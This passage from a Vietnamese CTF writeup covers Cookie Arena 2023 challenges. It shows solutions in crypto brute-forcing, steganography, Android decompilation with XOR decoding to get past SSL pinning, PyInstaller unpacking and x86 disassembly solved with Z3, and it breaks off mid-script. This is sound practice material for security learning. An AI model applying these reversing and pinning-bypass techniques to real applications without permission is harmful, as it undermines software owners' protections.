	<span class="n">tmp</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="n">block_size</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="nf">bytes</span><span class="p">([</span><span class="n">block_size</span><span class="o">-</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">%</span><span class="n">block_size</span><span class="p">)]))</span>

<span class="k">def</span> <span class="nf">split_block</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">block_size</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="nf">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">block_size</span><span class="p">],</span><span class="sh">'</span><span class="s">little</span><span class="sh">'</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">block_size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">plus_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">shift</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">+</span><span class="n">shift</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">mul_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">mul</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">*</span><span class="n">mul</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">bit_loc</span><span class="p">):</span>
	<span class="nf">return </span><span class="p">(</span><span class="n">data</span><span class="o">^</span><span class="p">(</span><span class="n">data</span><span class="o">&gt;&gt;</span><span class="n">bit_loc</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

<span class="k">def</span> <span class="nf">pow_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exp_func</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">base</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">pow</span><span class="p">(</span><span class="n">base</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="k">return</span> <span class="nf">list</span><span class="p">(</span><span class="nf">pow_func</span><span class="p">(</span><span class="nf">exp_func</span><span class="p">(</span><span class="nf">xor_shift_right_func</span><span class="p">(</span><span class="nf">mul_func</span><span class="p">(</span><span class="nf">plus_func</span><span class="p">(</span><span class="n">block</span><span class="p">,</span><span class="mi">3442055609</span><span class="p">),</span><span class="mi">2898124289</span><span class="p">),</span><span class="mi">1</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">),</span><span class="n">e</span><span class="p">,</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="nf">split_block</span><span class="p">(</span><span class="nf">padding_pkcs7</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="mi">4</span><span class="p">))</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">1341161101353773850779</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">Cipher</span> <span class="o">=</span> <span class="p">[</span><span class="mi">752589857254588976778</span><span class="p">,</span> <span class="mi">854606763225554935934</span><span class="p">,</span> <span class="mi">102518422244000685572</span><span class="p">,</span> <span class="mi">779286449062901931327</span><span class="p">,</span> <span class="mi">424602910997772742508</span><span class="p">,</span> <span class="mi">1194307203769437983433</span><span class="p">,</span> <span class="mi">501056821915021871618</span><span class="p">,</span> <span class="mi">691835640758326884371</span><span class="p">,</span> <span class="mi">778501969928317687301</span><span class="p">,</span> <span class="mi">1260460302610253211574</span><span class="p">,</span> <span class="mi">833211399330573153864</span><span class="p">,</span> <span class="mi">223847974292916916557</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">index</span> <span class="o">!=</span> <span class="mi">11</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">tqdm</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">))):</span>
            <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">tqdm</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">))):</span>
                <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">)):</span>
                    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">)):</span>
                        <span class="n">flag</span> <span class="o">=</span> <span class="p">(</span><span class="n">printable</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">y</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">z</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">t</span><span class="p">]).</span><span class="nf">encode</span><span class="p">()</span> 
                        <span class="k">if</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">flag</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Cipher</span><span class="p">[</span><span class="n">index</span><span class="p">]:</span> 
                            <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
                            <span class="nf">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span> 
        <span class="c1"># b'}\x03\x03\x03'
</span>        <span class="c1"># b'x}\x02\x02'
</span>        <span class="c1"># b'xx}\x01'
</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">tqdm</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">))):</span>
            <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">printable</span><span class="p">)):</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="p">(</span><span class="n">printable</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="n">printable</span><span class="p">[</span><span class="n">y</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
                <span class="k">if</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">flag</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Cipher</span><span class="p">[</span><span class="n">index</span><span class="p">]:</span> 
                    <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
                    <span class="nf">exit</span><span class="p">()</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="p">(</span><span class="n">printable</span><span class="p">[</span><span class="n">y</span><span class="p">]</span> <span class="o">+</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
            <span class="k">if</span> <span class="nf">ecb_mode</span><span class="p">(</span><span class="n">flag</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">Cipher</span><span class="p">[</span><span class="n">index</span><span class="p">]:</span> 
                <span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
                <span class="nf">exit</span><span class="p">()</span>
            
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span>
        <span class="nf">brute</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag: CHH{w3lc0m3_70_7h3_m47h_w0rld(1_h4t3_1t_th3r3)}</strong></p>
    <!-- <h2 id="table-of-contents">Table of Contents</h2>

<ul>
  <li><a href="#0x00-giới-thiệu">0x00 Giới thiệu</a></li>
  <li><a href="#0x01-stenography">0x01 Stenography</a>
    <ul>
      <li><a href="#cutie-k1tty">Cutie K1tty</a></li>
    </ul>
  </li>
  <li><a href="#0x02-mobile">0x02 Mobile</a>
    <ul>
      <li><a href="#cat-me">Cat Me</a></li>
      <li><a href="#pinned-cookie">Pinned Cookie</a></li>
    </ul>
  </li>
  <li><a href="#0x03-reverse">0x03 Reverse</a>
    <ul>
      <li><a href="#pyreverse">Pyreverse</a></li>
      <li><a href="#jump">Jump</a></li>
      <li><a href="#rev1">Rev1</a></li>
    </ul>
  </li>
  <li><a href="#0x04-forensic">0x04 Forensic</a>
    <ul>
      <li><a href="#sổ-đăng-ký">Sổ đăng ký</a></li>
      <li><a href="#tin-học-văn-phòng-cơ-bản">Tin học văn phòng cơ bản</a></li>
    </ul>
  </li>
  <li><a href="#0x05-web">0x05 Web</a>
    <ul>
      <li><a href="#magic-login">Magic Login</a></li>
      <li><a href="#magic-login-harder">Magic Login Harder</a></li>
      <li><a href="#be-positive">Be Positive</a></li>
      <li><a href="#slow-down">Slow Down</a></li>
    </ul>
  </li>
  <li><a href="#0x06-crypto">0x06 Crypto</a>
    <ul>
      <li><a href="#basic-operator">Basic Operator</a></li>
    </ul>
  </li>
</ul>

<h2 id="0x00-giới-thiệu">0x00 Giới thiệu</h2>
<p>Hai ngày cuối tuần, mình cùng một số anh em trong câu lạc bộ chơi giải <a href="https://battle.cookiearena.org/arenas/cookie-arena-ctf-season-2">Cookie Arena CTF 2023</a>. Cuộc thi được diễn ra liên tục trong 48 giờ. Chắc do bị DDOS bất ngờ, đáng lẽ cuộc thi được bắt đầu từ 21h nhưng phải hoãn lại. Sang tới tận ngày hôm sau chúng mình mới có thể chơi bình thường.</p>

<p>Đây là lần đầu tiên mình tham gia trọn vẹn một kỳ thi CTF online. Cuộc thi diễn ra theo hình thức cá nhân, nhưng bọn mình lại chơi cùng nhau. Kết quả cả đội đứng thứ 6 chung cuộc nhưng sẽ không viết writeup và nhận quà từ ban tổ chức do vi phạm quy định hehe.</p>

<p>Dưới đây là bài giải cho một số bài mình làm được trong cuộc thi và sau khi có được hướng dẫn từ các anh chị khác.</p>

<p><img src="/images/cookiehanhoan2023/image.png" alt="Alt text" /></p>

<h2 id="0x01-stenography">0x01 Stenography</h2>

<h3 id="cutie-k1tty">Cutie K1tty</h3>

<p><strong>Description</strong></p>

<p>Một chú mèo cute chứa đựng nhiều điều bí ẩn. Hãy tìm ra điều thú vị đó.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/18iGHuowoRUsWqwNmnuWqrqsHbMLwBJG_/view?usp=drive_link">CutieK1tty</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài toán cho chúng ta hình ảnh một con mèo</p>

<p><img src="/images/cookiehanhoan2023/cut3_c4t.png" alt="Alt text" /></p>

<p>Như thường lệ, mình sẽ kiểm tra bức ảnh này có ẩn dấu những cụm từ nào đáng chú ý hay không</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings cut3_c4t.png
y0u_4r3_cl0s3.rar
Cat!
f1n4lly.txt
</code></pre></div></div>

<p>Chúng ta thấy có khá nhiều từ khả nghi ở đây. mình sẽ thử chuyển file png này thành file zip để xem có thể khai thác được gì không.</p>

<p>Khi giải nén ra, ta thu được 2 file mới là <code class="language-plaintext highlighter-rouge">purrr_2.mp3</code> và <code class="language-plaintext highlighter-rouge">y0u_4r3_cl0s3.rar</code>. Tiếp tục giải nén file <code class="language-plaintext highlighter-rouge">y0u_4r3_cl0s3.rar</code>, xuất hiện thông báo lỗi</p>

<p><img src="/images/cookiehanhoan2023/image-5.png" alt="Alt text" /></p>

<p>Đưa file này vào <code class="language-plaintext highlighter-rouge">HxD</code> để kiểm tra các magic byte, phát hiện ra file đã bị corrupt do header của nó là <strong>Cat</strong>. Ở đây, chúng ta chỉ cần sửa header lại thành <strong>Rar</strong> là có thể giải nén được.</p>

<p><img src="/images/cookiehanhoan2023/image-6.png" alt="Alt text" /></p>

<p>Nhận thấy còn file <code class="language-plaintext highlighter-rouge">purrr_2.mp3</code> chưa được sử dụng. Khả năng cao nó chứa password của file rar ở trên.</p>

<p>Sử dụng tool <code class="language-plaintext highlighter-rouge">Audacity</code>, ta có được <strong>sp3ctrum_1s_y0ur_fr13nd</strong> là password để giải nén.</p>

<p><img src="/images/cookiehanhoan2023/image-8.png" alt="Alt text" /></p>

<p>Đến đây, chúng ta chỉ cần decode base64 quen thuộc sẽ tìm ra được flag</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">ZjByM241MWNzX21hNXQzcg==</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">f0r3n51cs_ma5t3r</span><span class="dl">'</span>
</code></pre></div></div>

<p><strong>Flag: CHH{f0r3n51cs_ma5t3r}</strong></p>

<h2 id="0x02-mobile">0x02 Mobile</h2>

<h3 id="cat-me">Cat Me</h3>

<p><strong>Description</strong></p>

<p>Với người dùng bình thường, họ không thể nhìn thấy gì. Nhưng hacker thì họ luôn có cách khác. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1Uq8wLlBl3glN5nbHMW5tkiP5IDrZlJ0D/view?usp=drive_link">Cat Me</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Dùng <code class="language-plaintext highlighter-rouge">jadx</code> để decompile file apk. Sử dụng search để tìm các cụm từ khả nghi. Khi search từ khóa <strong>flag</strong>, chúng ta thấy có đoạn mã sau khả nghi.</p>

<p><img src="/images/cookiehanhoan2023/image-4.png" alt="Alt text" /></p>

<p>Copy hết các ký tự trong <code class="language-plaintext highlighter-rouge">arrayList</code>, nhận thấy rằng đây là <strong>base64</strong>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Q0hIe00wcmVfMW43RVIzU1RJTjlfN2gxTjZfMU5fbG9nY2F0fQ==</span><span class="sh">"</span>
<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag: CHH{M0re_1n7ER3STIN9_7h1N6_1N_logcat}</strong></p>

<h3 id="pinned-cookie">Pinned Cookie</h3>

<p><strong>Description</strong></p>

<p>Một kết nối cực an toàn giữa người dùng và server đã được thiết lập. Kẻ tấn công không thể đứng giữa để nghe ngóng thông tin. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1oagLC-ryf9leAl4LrD9zVETTB6cPZDk_/view?usp=drive_link">Pinned Cookie</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Quan sát trong <code class="language-plaintext highlighter-rouge">jadx</code>, chúng ta thấy có hàm <code class="language-plaintext highlighter-rouge">MainActivity</code></p>

<p><img src="/images/cookiehanhoan2023/image-2.png" alt="Alt text" /></p>

<p>Nhìn tổng quan hàm, chúng ta lại thấy đoạn code <code class="language-plaintext highlighter-rouge">arrayList</code> quen thuộc giống như bài <code class="language-plaintext highlighter-rouge">Cat Me</code>. Ở đây, xuất hiện thêm một chuỗi lạ là <strong>“sTroN6PaSswORD”</strong>.</p>

<p><img src="/images/cookiehanhoan2023/image-1.png" alt="Alt text" /></p>

<p>Tiếp tục đi sâu vào từng hàm có liên quan tới chuỗi này. Chúng ta tìm thấy một hàm khả nghi</p>

<p><img src="/images/cookiehanhoan2023/image-3.png" alt="Alt text" /></p>

<p>Nội dung chính của hàm <code class="language-plaintext highlighter-rouge">y0</code> này là đi decode chuỗi base64 thu được từ <code class="language-plaintext highlighter-rouge">arrayList</code>, tiếp đến xor từng byte một với chuỗi ký tự <strong>“sTroN6PaSswORD”</strong>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span> 

<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">sTroN6PaSswORD</span><span class="sh">'</span>
<span class="n">base64_str</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MBw6FDdZBT4wRzkQMB0jYEc8EUUDLQwjPiE8LR0TDw==</span><span class="sh">'</span>

<span class="n">bytesFlag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">base64_str</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">bytesFlag</span><span class="p">)):</span> 
    <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">bytesFlag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>

<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag: CHH{yoU_c4N_bYP45S_sSL_PInninG}</strong></p>

<h2 id="0x03-reverse">0x03 Reverse</h2>

<h3 id="pyreverse">Pyreverse</h3>

<p><strong>Description</strong></p>

<p>Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/18g2ZqlfYS4pfEZbAxJD1_9wIVp3KS1A-/view?usp=drive_link">Pyreverse</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Sử dụng <code class="language-plaintext highlighter-rouge">Detect It Easy</code>, kiểm tra file <strong>.exe</strong> được pack bằng <strong>PyInstaller</strong>. Tới đây, mình sử dụng công cụ <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> để unpack lại file <strong>.py</strong> ban đầu.</p>

<p><img src="/images/cookiehanhoan2023/image-7.png" alt="Alt text" /></p>

<p>Sau khi thu được file <code class="language-plaintext highlighter-rouge">pyreverser.pyc</code>, mình tiếp tục lên <a href="https://ctfever.uniiem.com">CTFever</a> để decompile file <strong>.pyc</strong> thành <strong>.py</strong> ban đầu.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Decompiled on CTFever Premium
# Decompile engine: Decompyle++ (pycdc)
# Python version: 3.10
</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="k">def</span> <span class="nf">reverse_string</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="n">scrambled</span> <span class="o">=</span> <span class="sh">''</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">scrambled</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
            <span class="k">continue</span>
        <span class="n">scrambled</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">scrambled</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">secret_flag</span> <span class="o">=</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="nf">reverse_string</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sh">'</span><span class="s">Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==</span><span class="sh">'</span><span class="p">)).</span><span class="nf">decode</span><span class="p">())</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Welcome to PyReverser!</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Please enter a word or phrase:</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">user_input</span> <span class="o">=</span> <span class="nf">input</span><span class="p">()</span>
    <span class="n">generated_value</span> <span class="o">=</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="nf">reverse_string</span><span class="p">(</span><span class="n">user_input</span><span class="p">.</span><span class="nf">upper</span><span class="p">()))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Generated value:</span><span class="sh">'</span><span class="p">,</span> <span class="n">generated_value</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Can you find the hidden flag?</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">reversed_flag</span> <span class="o">=</span> <span class="nf">reverse_string</span><span class="p">(</span><span class="n">secret_flag</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Reversed flag:</span><span class="sh">'</span><span class="p">,</span> <span class="n">reversed_flag</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
    <span class="c1"># return None
</span></code></pre></div></div>

<p>Dễ dàng decode base64 đoạn mã <code class="language-plaintext highlighter-rouge">Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==</code>, chúng ta sẽ có được flag.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">Flag: CHH{python2Exi_Reverse_ENginering}</span><span class="dl">'</span>
</code></pre></div></div>

<p><strong>Flag: CHH{python2Exi_Reverse_ENginering}</strong></p>

<h3 id="jump">Jump</h3>

<p><strong>Description</strong></p>

<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1nCOaD5emAyAqQmJrhB8hlu4UdCbBmRuH/view?usp=drive_link">Jump</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài toán cho chúng ta một file <code class="language-plaintext highlighter-rouge">jump.exe</code>. Bỏ file này vào <code class="language-plaintext highlighter-rouge">IDAPRO 32</code>, chúng ta thấy được đoạn mã giả của hàm <code class="language-plaintext highlighter-rouge">main</code>.</p>

<p><img src="/images/cookiehanhoan2023/image-10.png" alt="Alt text" /></p>

<p>Nhiệm vụ của hàm <code class="language-plaintext highlighter-rouge">main</code> là cho nhập giá trị vào biến <code class="language-plaintext highlighter-rouge">jump</code> rồi nhảy đến địa chỉ đó. Vì vậy, chúng ta chỉ cần nhảy đến địa chỉ hàm <code class="language-plaintext highlighter-rouge">_flag</code> là có thể lấy được flag.</p>

<p>Lưu ý: <strong>0x00401500 = 4199680</strong></p>

<p><img src="/images/cookiehanhoan2023/image-11.png" alt="Alt text" /></p>

<p><strong>Flag: CHH{JUMP_T0_TH3_M00N}</strong></p>

<h3 id="rev1">Rev1</h3>

<p><strong>Description</strong></p>

<p>Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1rzlX1TX4J8XDBuSUj3s8EtErXCOeKKVj/view?usp=sharing">Rev1</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài này mình không biết debug nên mình lấy luôn code của các bạn đã writeup.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debug055:02760002 movzx   eax, byte ptr [edi+ecx]
debug055:02760006 imul    eax, 6Eh ; 'n'
debug055:02760009 inc     ecx
debug055:0276000A movzx   edx, byte ptr [edi+ecx]
debug055:0276000E imul    edx, 1C3h
debug055:02760014 add     eax, edx
debug055:02760016 inc     ecx
debug055:02760017 movzx   edx, byte ptr [edi+ecx]
debug055:0276001B imul    edx, 348h
debug055:02760021 add     eax, edx
debug055:02760023 inc     ecx
debug055:02760024 movzx   edx, byte ptr [edi+ecx]
debug055:02760028 imul    edx, 1F8h
debug055:0276002E add     eax, edx
debug055:02760030 inc     ecx
debug055:02760031 movzx   edx, byte ptr [edi+ecx]
debug055:02760035 imul    edx, 357h
debug055:0276003B sub     eax, edx
debug055:0276003D inc     ecx
debug055:0276003E movzx   edx, byte ptr [edi+ecx]
debug055:02760042 imul    edx, 46h ; 'F'
debug055:02760045 add     eax, edx
debug055:02760047 inc     ecx
debug055:02760048 movzx   edx, byte ptr [edi+ecx]
debug055:0276004C imul    edx, 16Fh
debug055:02760052 sub     eax, edx
debug055:02760054 inc     ecx
debug055:02760055 movzx   edx, byte ptr [edi+ecx]
debug055:02760059 imul    edx, 2FEh
debug055:0276005F sub     eax, edx
debug055:02760061 inc     ecx
debug055:02760062 movzx   edx, byte ptr [edi+ecx]
debug055:02760066 imul    edx, 17Ah
debug055:0276006C add     eax, edx
debug055:0276006E inc     ecx
debug055:0276006F movzx   edx, byte ptr [edi+ecx]
debug055:02760073 imul    edx, 15Ah
debug055:02760079 add     eax, edx
debug055:0276007B inc     ecx
debug055:0276007C movzx   edx, byte ptr [edi+ecx]
debug055:02760080 imul    edx, 326h
debug055:02760086 sub     eax, edx
debug055:02760088 inc     ecx
debug055:02760089 movzx   edx, byte ptr [edi+ecx]
debug055:0276008D imul    edx, 190h
debug055:02760093 sub     eax, edx
debug055:02760095 inc     ecx
debug055:02760096 movzx   edx, byte ptr [edi+ecx]
debug055:0276009A imul    edx, 129h
debug055:027600A0 add     eax, edx
debug055:027600A2 inc     ecx
debug055:027600A3 movzx   edx, byte ptr [edi+ecx]
debug055:027600A7 imul    edx, 2EDh
debug055:027600AD add     eax, edx
debug055:027600AF inc     ecx
debug055:027600B0 movzx   edx, byte ptr [edi+ecx]
debug055:027600B4 cmp     eax, 29CBh
</code></pre></div></div>

<p>Đến đây, bài toán đưa về việc giải hệ phương trình 14 phương trình, 14 ẩn. Để giải hệ phương trình này, các bạn có thể giải tay bằng những kiến thức đã được học trong môn ĐSTT haha.</p>

<p>Còn mình sẽ sử dụng Z3 để giải quyết bài toán này.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">z3</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">solver</span> <span class="o">=</span> <span class="nc">Solver</span><span class="p">()</span>

